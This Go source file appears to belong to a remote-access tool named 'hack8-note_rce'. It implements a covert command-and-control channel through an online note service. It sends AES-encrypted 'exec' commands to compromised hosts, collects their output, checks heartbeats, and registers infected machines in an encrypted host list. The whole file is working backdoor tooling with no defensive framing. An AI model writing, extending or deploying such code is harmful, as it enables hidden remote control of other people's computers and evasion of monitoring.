package Util

import (
	"encoding/json"
	"fmt"
	"hack8-note_rce/mode"
	"os"
	"time"
)

func Hostexec(noteaddr, aeskey, command string) string {

	key := []byte(aeskey)
	sh := []byte("exec" + ":" + command)

	//写
	base64, err := AesCbcEncryptBase64(sh, key, []byte(Ivaes))
	if err != nil {
		fmt.Println("加密命令错误")
		return ""
	}
	WriteNote(noteaddr, base64)

	time.Sleep(15 * time.Second)

	//读
	byBase64, err := AesCbcDecryptByBase64(GetNote(noteaddr), key, []byte(Ivaes))
	if err != nil {
		fmt.Println("读取结果错误")
		return ""
	}
	return string(byBase64)
}

// 获取主机列表
func HostList(adminaddr, aeskey string) []mode.Host {
	note := GetNote(adminaddr)

	notes, err := AesCbcDecryptByBase64(note, []byte(aeskey), []byte(Ivaes))

	hosts := []mode.Host{}
	err = json.Unmarshal(notes, &hosts)
	if err != nil {
		return nil
	}

	return hosts
}

func RefreshHost(list []mode.Host, adminaddr, aeskey string) {
	ii := make(chan int, len(list))
	for i := range list {
		go VerifHost(list[i].Noteaddr, aeskey, ii, i)
	}

	var iiii []int
	var iii int

	for i := 0; i < len(list); i++ {
		iii = <-ii
		if iii != -1 {
			iiii = append(iiii, iii)
		}
	}
	var hostList []mode.Host
	for i, _ := range iiii {
		hostList = append(hostList, list[iiii[i]])
	}
	marshal, err := json.Marshal(hostList)
	if err != nil {
		return
	}
	base64, err := AesCbcEncryptBase64(marshal, []byte(aeskey), []byte(Ivaes))
	println(string(marshal))
	WriteNote(adminaddr, base64)

}

// 清除下线主机
func VerifHost(noteaddr string, aeskey string, ii chan int, i int) {

	key := []byte(aeskey)
	sh := []byte("ping:ping")

	//写
	base64, _ := AesCbcEncryptBase64(sh, key, []byte(Ivaes))
	WriteNote(noteaddr, base64)

	time.Sleep(15 * time.Second)

	//读
	msg := GetNote(noteaddr)
	byBase64, _ := AesCbcDecryptByBase64(msg, key, []byte(Ivaes))
	fmt.Println(string(msg))
	fmt.Println(string(byBase64))
	if string(byBase64) == "heartbeat" {
		ii <- i
	} else {
		ii <- -1
	}
}

// 添加主机
func AddHost(adminaddr, noteaddr, aeskey string) {
	host := mode.Host{}
	host.HostName, _ = os.Hostname()
	host.Noteaddr = noteaddr
	list := HostList(adminaddr, aeskey)
	var hosts []mode.Host
	if list != nil {
		hosts = list
	} else {
		hosts = []mode.Host{}
	}

	hosts = append(hosts, host)
	marshal, err := json.Marshal(hosts)
	if err != nil {
		return
	}
	mes, _ := AesCbcEncryptBase64(marshal, []byte(aeskey), []byte(Ivaes))
	WriteNote(adminaddr, string(mes))

}
